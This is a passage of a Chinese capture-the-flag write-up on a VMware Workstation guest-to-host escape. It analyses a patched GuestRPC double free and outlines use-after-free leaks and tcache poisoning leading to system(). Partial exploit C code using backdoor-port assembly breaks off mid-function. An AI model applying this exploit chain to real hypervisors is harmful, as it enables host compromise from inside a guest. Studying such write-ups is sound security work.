words<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression">uint64 quad</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>实际上就是对相应的寄存器做一个设置。</p><p>除了以上的函数，vmx还提供了一种面向对象的方法实现以上功能，VMWareRPCChannel类，该类可以在内核和用户模式下使用。</p><blockquote><p>By using <a href="http://kdvmware.sysprogs.org/dox/a00032.html">VMWareRPCChannel</a> class it is possible to execute arbitrary GuestRPC requests, that  VMWare supports. However, the question of adding our own request types  is still open. Let’s examine the VMWARE-VMX.EXE internals. When a  GuestRPC is being issued by guest, code inside the VMWARE-VMX.EXE  searches the so-called GuestRPC handler table for a handler  corresponding the the issued request. A GuestRPC handler entry format  can be defined by the following structure:</p></blockquote><p>具体的实现这里不赘述，此外长亭的师傅也实现了一套Rpc的通信机制，在其知乎文章有分析。</p><p>通过这个RPCI可以直接向RPC，以往版本的漏洞分析中已经有该DnD漏洞的存在。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8c778cb84b93e2c11fe15cbc508a537bd365b3e7.png" alt="图片.png"><br> memcpy没有size的判断，导致第二个包可以直接改totalsize为一个大值，这样导致了memcpy的溢出。发送Dnd的代码在dndCPTransportGuestRpc.hpp中，同样可以在open-vmtools里面找到源码。有人总结出了发送路径。</p><blockquote><p>rpcv3util::SendMsg-&gt;DnDCPTransportGuestRpc::SendPacket-&gt;RpcChannel_Send-&gt;Message_Send-&gt;backdoor</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>题目给出了</p><p>rwctf.ovf、rwctf-disk1.vmdk、rwctf.mf、vmware-vmx-patched、VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle和vmware-vmx</p><p>使用vof vmdk mf可以创建一个题目相同环境的虚拟机，patched即为题目环境的vmx，而bundle安装包中的是给出的vmware-vmx。</p><p>使用bindiff比较patched和原版的不同可以快速定位漏洞位置，bindiff官网在外网，可以在52破解下载。</p><p>使用ida的bindiff插件，然后把diff结果导入bindiff软件即可。</p><p>查看出来的不同有1处，</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d11ec0897a90dd8c3ffacd41ebf25d705c91d72f.png" alt="图片.png"><br> 双击查看函数内容</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7d058ac9547b0c5f1d39ba965dd9b771c627d9fb.png" alt="图片.png"></p><p>可以看到patched地方加入了大部分的nop指令，回到ida仔细分析该流程处nop掉的东西是什么。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-213799f6fc4e4063222b7f27d7ff3bf3d6a95b52.png" alt="图片.png"></p><p>仔细比较发现有一处and被修改，还有一处call之前的一个mov指令被nop掉了，F5回去查看被改掉的位置。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b60e6ffb7fa00eee453237c55f8b52c31cdb4593.png" alt="图片.png"></p><p>少了一处被置为0的操作，还有一处and操作修改，查看整个函数，大部分都是<code>GuestMsg: Channel</code>之类的东西，以及上面的switch操作，此外报错都是一些协议错误以及格式之类的东西，猜测这里是RPC指令的处理函数。</p><p>然后我就一头扎进了open-vm的源码，，。。</p><p>看了非常久，大概得出一个结构体的模型</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-61000bff1bf24027f6e26da3bdf1ea5dfc805946.png" alt="图片.png"></p><p>其中大部分的操作还看不太懂，然后突然想起来查看GuestRPC 的操作流程。</p><ul><li>打开 GuestRPC 通道</li><li>发送命令长度</li><li>发送命令数据</li><li>接收回复大小</li><li>接收回复数据</li><li>发出接收结束信号</li><li>关闭频道</li></ul><p>发现可以和这里的switch对应起来，可以更加清除的理解其内容。</p><p>这里去掉了置0操作，没有将第一处buf置空，第二处把标志改为了21，这里可能是漏洞形成的重点。</p><p>根据正常流程，目标处调用的是这样一个函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">close_backdoor</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int16 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">free</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_176D90</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_55A0E0</span><span class="token punctuation">(</span><span class="token string">"GuestRpc: Closing RPCI backdoor channel %u after send completion\n"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_189FE0</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里有一个if分支是free掉a1+8位置的buf，要求是a3 and 0x20!&#x3D;0，这就刚好和patch的地方相符合，这里会导致一次free。</p><p>此处释放的缓冲区是偏移为8的地方的缓冲区，该缓冲区对应于内部用于存储传递回用户的回复数据的缓冲区。</p><p>同时在switch&#x3D;6的时候，此处会再次释放，这就导致了DF存在，而在这个DF的中间，重复使用该区域，可以利用为UAF。</p><p>下面就有了基本的思路</p><ul><li>leak</li><li>更改tcache的fd</li><li>获取<code>rip</code>控制<code>rdi</code>调用<code>system(&quot;/usr/bin/xcalc &amp;&quot;)</code></li></ul><p>在此guestrpc的区间内，对堆的操作非常少，所以该漏洞利用也是比较稳固的。</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>leak操作利用的是比较老套的uaf利用</p><ul><li>分配三个通道 [A]、[B] 和 [C]</li><li>将命令发送<code>info-set</code>到通道 [A]</li><li>打开通道 [B] 并发出 a <code>info-get</code>以检索我们刚刚设置的数据</li><li>在通道 [B] 上发出回复长度和回复读取命令</li><li>在通道 [B] 上调用错误的 finalize 命令，释放底层的回复缓冲区</li><li>在通道 [C] 上调用<code>info-get</code>并接收回复长度，它在我们刚刚分配的同一地址分配一个缓冲区</li><li>关闭通道 [B]，再次释放缓冲区</li><li>阅读频道[C]上的回复以泄露我们的数据</li></ul><p>但是在channel C上形成的uaf，却并不能做到在tcache中泄露想要的glibc地址，所以在此基础上还需要往C中填入一些可以利用的地址。</p><p>这时候考虑到2017年的一个cve，通过dnd_version造成vtable的leak。</p><p>分析dnd_version如下。ida中搜索<code>vmx.capability.dnd_version</code>，找到对应的bind函数。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3f065bd71745da225b1c04c4a6d034e89f421c8.png" alt="图片.png"></p><p>其他的RPC命令类似，在发送“vmx.capability.dnd_version”命令的时候，对应的处理函数中如果发现当前版本和设置的版本不一致，就会调用函数创建新的 object，把原来的版本的object销毁。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_1116D0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> __int64 reply<span class="token punctuation">,</span> __int64 reply_len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er12</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-30h] BYREF</span>  <span class="token keyword">int</span> v13<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-2Ch] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a4 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"1 argument expected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_5611D0</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Non-integer argument"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Invalid protocol version."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_171460</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token function">sub_4723A0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_472380</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_1711E0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_12FA20</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Failed to set VMDB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token function">Tools_SetGuestDnDCapable</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>传入一个参数代表版本，如果不符合则销毁之前的结构体，创建一个新的结构体。更新在<code>vmx.capability.dnd_version</code>也有对应实现。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bb838684db02dce7205e00d839ff208fed7e2264.png" alt="图片.png"></p><p>追踪函数</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6bea8ffd78640f22c86266f875cf6f17ba55736.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-028a1df016d78ca5454c36d7bdd28d0c504175cb.png" alt="图片.png"></p><p>那么可以猜到新的结构体大小总是为0xa8。可以通过该方法，控制buf的大小为0xa8，销毁原来的object获得新的object的时候，把channel B的UAF chunk申请出来，然后利用channel C leak libc基址。</p><p>有了leak，利用起来就简单了，直接改fd，然后劫持到bss段，改掉某一个函数指针为system即可。</p><p>新的leak方式如下</p><ul><li>开启channel A和channel B</li><li>A的输出缓冲区为bufA,A利用漏洞free bufA</li><li>然后B给guest发送out put，这时候控制B的buf大小和A一样，此时free的A再次被malloc出来</li><li>释放A，同时buf A被再次释放，此时调用<code>vmx.capability.dnd_version</code>，虚表在此时被写入bufB</li><li>leak出process base 然后根据偏移即可计算出system 以及一些函数指针的地址。</li></ul><p>最后以相同的方式，劫持fd即可,下面的exp是长亭师傅的，根据通信原理实现了一套通信机制，具体内容看参考，不赘述。</p><p>exp：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0xc9435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl 